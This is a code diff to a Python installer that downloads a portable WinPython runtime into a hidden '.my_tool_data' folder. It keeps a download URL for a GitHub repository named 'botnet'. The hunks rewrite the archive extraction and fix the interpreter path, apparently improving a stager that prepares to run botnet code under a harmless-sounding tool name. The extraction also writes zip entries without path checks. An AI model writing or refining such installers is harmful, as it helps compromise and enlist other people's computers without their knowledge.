@@ -8,7 +8,7 @@ from pathlib import Path
 
 working_dir = Path.home() / ".my_tool_data"
 runtime_dir = working_dir / "python_runtime"
-portable_python = runtime_dir / "python.exe"
+portable_python = runtime_dir / "python" / "python.exe"
 
 github_zip_url = "https://github.com/VinceDriesen/botnet/archive/refs/heads/main.zip" 
 winpython_zip_url = "https://github.com/winpython/winpython/releases/download/17.2.20251222post1/WinPython64-3.14.2.0dot_post1.zip"
@@ -55,18 +55,29 @@ def setup_win_portable_python():
         print("Downloading WinPython")
         urllib.request.urlretrieve(winpython_zip_url, str(zip_path))
         
-        print("Extracting")
+        print("Extracting and flattening")
         with zipfile.ZipFile(zip_path, 'r') as zip_ref:
-            zip_ref.extractall(runtime_dir)
-        
-        if not portable_python.exists():
-            for subpath in runtime_dir.rglob("python.exe"):
-                global portable_python
-                portable_python = subpath
-                break
+            for member in zip_ref.infolist():
+                parts = Path(member.filename).parts
+                
+                if len(parts) > 1:
+                    new_member_path = Path(*parts[1:])
+                    target_path = runtime_dir / new_member_path
+                    
+                    if member.is_dir():
+                        target_path.mkdir(parents=True, exist_ok=True)
+                    else:
+                        target_path.parent.mkdir(parents=True, exist_ok=True)
+                        with zip_ref.open(member) as source, open(target_path, "wb") as target:
+                            shutil.copyfileobj(source, target)
         
         zip_path.unlink()
-        print(f"Portable Python ready at: {portable_python}")
+        
+        if portable_python.exists():
+            print(f"Portable Python ready at: {portable_python}")
+        else:
+            print("Warning: python.exe not found in the expected location after flattening.")
+
     except Exception as e:
         print(f"Failed to set up Windows portable Python: {e}")
         sys.exit(1)
